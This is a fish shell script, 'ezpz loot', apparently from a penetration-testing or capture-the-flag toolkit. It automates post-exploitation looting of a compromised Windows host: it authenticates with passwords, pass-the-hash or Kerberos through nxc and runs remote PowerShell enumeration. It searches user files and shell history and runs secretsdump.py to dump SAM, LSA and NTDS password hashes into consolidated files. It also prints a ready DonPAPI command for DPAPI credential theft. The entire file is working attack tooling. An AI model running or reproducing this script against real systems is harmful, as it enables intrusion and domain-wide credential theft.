function _ezpz_loot
    source $EZPZ_HOME/functions/_ezpz_colors.fish

    # Usage message
    set usage "
Usage: ezpz loot -t <target> -u <user> -d <domain> [-p <password> | -H <hash>] [-k] [-x <protocol>]
  Extracts information and secrets from a compromised Windows machine.

  -t, --target    Target IP or hostname of the compromised Windows machine. (Required)
  -u, --user      Username for authentication. (Required)
  -d, --domain    Domain for authentication. (Required)
  -p, --password  Password for authentication.
  -H, --hash      NT hash for pass-the-hash authentication.
  -k, --kerb      Use Kerberos authentication (requires a valid TGT).
  -x, --protocol  Protocol to use for remote execution (smb or winrm).
                  Default: winrm. If smb, PowerShell commands will be wrapped in 'powershell -c'.
"

    # Variables
    set target ""
    set user ""
    set domain ""
    set password ""
    set hash ""
    set kerb 0
    set protocol "winrm"

    # Argument parsing
    argparse 't/target=' 'u/user=' 'd/domain=' 'p/password=' 'H/hash=' 'k/kerb' 'x/protocol=' 'h/help' -- $argv
    or return 1

    if set -q _flag_help
        echo $usage
        return 0
    end

    # Validate required arguments
    if not set -q _flag_target
        ezpz_error "Missing target parameter."
        echo $usage
        return 1
    end
    if not set -q _flag_user
        ezpz_error "Missing user parameter."
        echo $usage
        return 1
    end
    if not set -q _flag_domain
        ezpz_error "Missing domain parameter."
        echo $usage
        return 1
    end

    # Set variables
    set target $_flag_target
    set user $_flag_user
    set domain $_flag_domain

    if set -q _flag_password
        set password $_flag_password
    end
    if set -q _flag_hash
        set hash $_flag_hash
    end
    if set -q _flag_kerb
        set kerb 1
    end
    if set -q _flag_protocol
        set protocol $_flag_protocol
    end

    # Validate protocol
    if test "$protocol" != "smb" -a "$protocol" != "winrm"
        ezpz_error "Invalid protocol specified: $protocol. Must be 'smb' or 'winrm'."
        echo $usage
        return 1
    end

    # Prerequisites check
    for tool in nxc secretsdump.py
        if not command -v $tool >/dev/null 2>&1
            ezpz_error "Required tool not found: $tool"
            return 1
        end
    end

    # Determine base directory
    set base_dir "."
    if set -q boxpwd
        set base_dir $boxpwd
    end

    # Create secretsdump directory
    set secretsdump_dir "$base_dir/secretsdump"
    if not test -d "$secretsdump_dir"
        mkdir -p "$secretsdump_dir"
        if test $status -ne 0
            ezpz_error "Failed to create directory: $secretsdump_dir"
            return 1
        end
    end

    # Time synchronization for Kerberos
    if test $kerb -eq 1
        if command -v ntpdate >/dev/null 2>&1
            ezpz_info "Synchronizing time with target for Kerberos authentication..."
            sudo ntpdate -u "$target" >/dev/null 2>&1
        else
            ezpz_warn "ntpdate not found. Skipping time sync. Kerberos may fail if clocks are skewed."
        end
    end

    # Build authentication arguments for nxc
    set nxc_args "$target" "-u" "$user" "-d" "$domain"
    if test -n "$password"
        set nxc_args $nxc_args "-p" "$password"
    else if test -n "$hash"
        set nxc_args $nxc_args "-H" "$hash"
    end
    if test $kerb -eq 1
        set nxc_args $nxc_args "-k"
    end

    # Determine PowerShell wrapper for SMB
    set pwsh_wrapper ""
    if test "$protocol" = "smb"
        set pwsh_wrapper "cmd /c powershell -c "
    end

    # Set trap for Ctrl+C
    trap "echo ''" INT

    # Section 1: Dumping Machine Information
    ezpz_header "Dumping machine information..."

    ezpz_info "Hostname"
    set cmd "hostname"
    ezpz_cmd $cmd
    nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$'

    ezpz_info "Operating System"
    set cmd "Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version"
    ezpz_cmd $cmd
    nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +7 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$'

    ezpz_info "Users with home directories"
    set cmd "Get-ChildItem C:/Users -Force | Select-Object Name"
    ezpz_cmd $cmd
    nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +7 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$' | grep -iv 'Desktop.ini'

    # Section 2: Getting Network Information
    ezpz_header "Getting network information..."

    ezpz_info "Network interfaces"
    set cmd "Get-NetIPConfiguration"
    ezpz_cmd $cmd
    nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | sed '1,/^$/d' | grep -E "^(InterfaceAlias|IPv4Address|IPv6Address|DefaultGateway)" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | grep -v -e '^$'

    ezpz_info "ARP Cache"
    set cmd "arp -a"
    ezpz_cmd $cmd
    nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +7 | tr -s " " | cut -d " " -f 5- | grep -v 'Interface' | awk '{print $1}' | sort -V | grep -v -e '^$'

    # Section 3: Extracting Secrets
    ezpz_header "Extracting secrets..."

    ezpz_info "Searching for flag.txt"
    set cmd "Get-ChildItem -Path C:/ -Recurse -Force -Filter flag.txt -ErrorAction SilentlyContinue | Get-Content"
    ezpz_cmd $cmd
    nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$' | sort -u

    ezpz_info "Searching for interesting files in user folders"
    set cmd "Get-ChildItem -Path C:/Users -Force -Recurse -Depth 3 -Include *.config,*.xml,*.json,*.yml,*.yaml,*.log,*.bak,*.old, *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ps1,*.bat, *.exe -ErrorAction SilentlyContinue | Select-Object FullName"
    ezpz_cmd $cmd
    nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$' | grep -vi 'appdata' | grep -vi 'local settings' | grep -vi 'application data' | sort -u

    ezpz_info "Extracting shell history (PowerShell and CMD)"
    set cmd "Get-ChildItem -Path C:/Users/*/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/*.txt -ErrorAction SilentlyContinue | ForEach-Object { Get-Content \$_.FullName -ErrorAction SilentlyContinue }"
    ezpz_cmd $cmd
    nxc $protocol $nxc_args -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$'

    # Section 4: SecretsDump.py Integration
    ezpz_header "Dumping credentials with secretsdump.py..."

    # Define output paths
    set secretsdump_output_base "$secretsdump_dir/$target-secrets"
    set this_target_parsed_file "$base_dir/${target}-secrets.parsed"
    set all_parsed_hashes_file_root "$base_dir/all-secrets.parsed"
    set tmp_this_target_collection (mktemp)

    # Trap for temporary file cleanup
    trap "rm -f '$tmp_this_target_collection'" EXIT TERM

    ezpz_info "Running secretsdump.py to extract hashes..."

    # Build secretsdump command arguments
    set secretsdump_cmd_args
    set target_auth_string ""

    # Construct authentication string
    if test -n "$user"
        set target_auth_string "$user"
        if test -n "$password"
            set target_auth_string "$target_auth_string:$password"
        end
        set target_auth_string "$target_auth_string@$target"
    else
        set target_auth_string "@$target"
    end

    set secretsdump_cmd_args $target_auth_string

    # Add authentication flags
    if test -n "$hash"
        set secretsdump_cmd_args $secretsdump_cmd_args "-hashes" ":$hash"
    else if test $kerb -eq 1
        set secretsdump_cmd_args $secretsdump_cmd_args "-k" "-no-pass"
    end

    set secretsdump_cmd_args $secretsdump_cmd_args "-outputfile" "$secretsdump_output_base"

    ezpz_cmd "secretsdump.py $secretsdump_cmd_args"
    secretsdump.py $secretsdump_cmd_args >/dev/null 2>&1

    # Track if any secretsdump output files were produced
    set secretsdump_output_found 0
    if test -f "${secretsdump_output_base}.sam" -o -f "${secretsdump_output_base}.secrets" -o -f "${secretsdump_output_base}.ntds"
        set secretsdump_output_found 1
    end

    if test $secretsdump_output_found -eq 1
        ezpz_info "Extracted secrets for $target found. Parsing and consolidating for this target..."

        # Process .sam file
        if test -f "${secretsdump_output_base}.sam"
            ezpz_info "Parsing SAM hashes from ${secretsdump_output_base}.sam..."
            cat "${secretsdump_output_base}.sam" | awk -F: '{print $1":"$4}' >> "$tmp_this_target_collection"
        end

        # Process .secrets file (LSA Secrets)
        if test -f "${secretsdump_output_base}.secrets"
            ezpz_info "Parsing LSA secrets from ${secretsdump_output_base}.secrets..."
            cat "${secretsdump_output_base}.secrets" | grep -oP '^\w+:\d+:[0-9a-f]{32}:[0-9a-f]{32}' | awk -F: '{print $1":"$4}' >> "$tmp_this_target_collection"
        end

        # Process .ntds file (NTDS.DIT hashes)
        if test -f "${secretsdump_output_base}.ntds"
            ezpz_info "Parsing NTDS hashes from ${secretsdump_output_base}.ntds..."
            cat "${secretsdump_output_base}.ntds" | awk -F: '{print $1":"$4}' >> "$tmp_this_target_collection"
        end

        # Consolidate all hashes collected for this target
        if test -s "$tmp_this_target_collection"
            sort -u "$tmp_this_target_collection" | tee "$this_target_parsed_file"
            ezpz_cmd "Parsed hashes for $target saved to '$this_target_parsed_file'."
        else
            ezpz_warn "No hashes extracted or found for $target in SAM/LSA/NTDS files."
        end

        # Consolidate ALL TARGETS' Hashes into all-secrets.parsed
        ezpz_info "Consolidating all collected hashes from all targets..."
        find "$base_dir" -maxdepth 1 -type f -name "*-secrets.parsed" -print0 | xargs -0 cat 2>/dev/null | sort -u > "$all_parsed_hashes_file_root"
        ezpz_cmd "All unique parsed hashes consolidated and saved to '$all_parsed_hashes_file_root'."

    else
        ezpz_error "secretsdump.py did not produce any .sam/.secrets/.ntds files for $target. Check authentication or logs."
    end

    echo ""

    # DonPAPI Suggestion (Next Step)
    if command -v donpapi >/dev/null 2>&1
        set donpapi_auth_arg_string ""
        
        # Reconstruct the authentication argument for donpapi
        if test -n "$password"
            set donpapi_auth_arg_string "-p $password"
        else if test -n "$hash"
            set donpapi_auth_arg_string "-H $hash"
        end

        if test -n "$donpapi_auth_arg_string"
            ezpz_cmd "Next Step: Try dumping DPAPI master keys and credentials with DonPAPI:"
            ezpz_info "donpapi collect -t $target -u \"$user\" $donpapi_auth_arg_string --ntfile \"$all_parsed_hashes_file_root\""
        else
            ezpz_warn "DonPAPI suggestion skipped: No password or hash provided for authentication."
        end
    else
        ezpz_warn "DonPAPI not found. Skipping suggestion."
    end

    echo ""

    # Finalization
    trap - INT
    ezpz_success "Done."
end 